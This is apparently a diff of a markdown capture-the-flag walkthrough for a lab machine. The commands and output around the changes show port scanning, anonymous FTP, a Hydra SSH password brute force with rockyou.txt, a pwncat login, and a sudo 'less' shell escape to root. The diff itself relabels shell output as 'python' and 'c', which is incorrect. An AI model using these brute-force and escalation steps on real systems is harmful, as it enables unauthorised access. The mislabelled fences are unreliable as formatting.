@@ -18,7 +18,7 @@ As always we start with rustscan I like its style and it instantly gives a respo
 rustscan -a $IP -- -A -sC -oN nmap.txt
 ````````
 
-````````
+````````python
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -173,7 +173,7 @@ So we have 3 ports open 21(FTP) ,22(ssh) ,80(HTTP). First, let's check what is i
 ftp $IP
 ````````
 
-````````
+````````python
 Connected to 10.10.63.149.
 220 (vsFTPd 3.0.3)
 Name (10.10.63.149:root): anonymous
@@ -205,7 +205,7 @@ Here we found a file called note_to_jake. let us see what is inside. in note_to_
 hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 6
 ````````
 
-````````
+````````python
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-31 00:53:23
@@ -225,7 +225,7 @@ YESS!!! we have successfully bruteforce the password. now let's log in as user j
 pwncat-cs jake@$IP
 ````````
 
-````````
+````````python
 [00:59:36] Welcome to pwncat 🐈!                                                                                                                              __main__.py:164
 Password: *********
 [00:59:43] 10.10.63.149:22: registered new host w/ db                                                                                                          manager.py:957
@@ -246,12 +246,12 @@ Okey, we have our first flag. now let's escalate our privilege and get root.txt.
 
 ## Privilage Esculation 
 
-````````
+````````c
 sudo /usr/bin/less /etc/profile
 !/bin/sh
 ````````
 
-````````
+````````python
 (remote) jake@brookly_nine_nine:/home/holt$ sudo -l
 Matching Defaults entries for jake on brookly_nine_nine:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
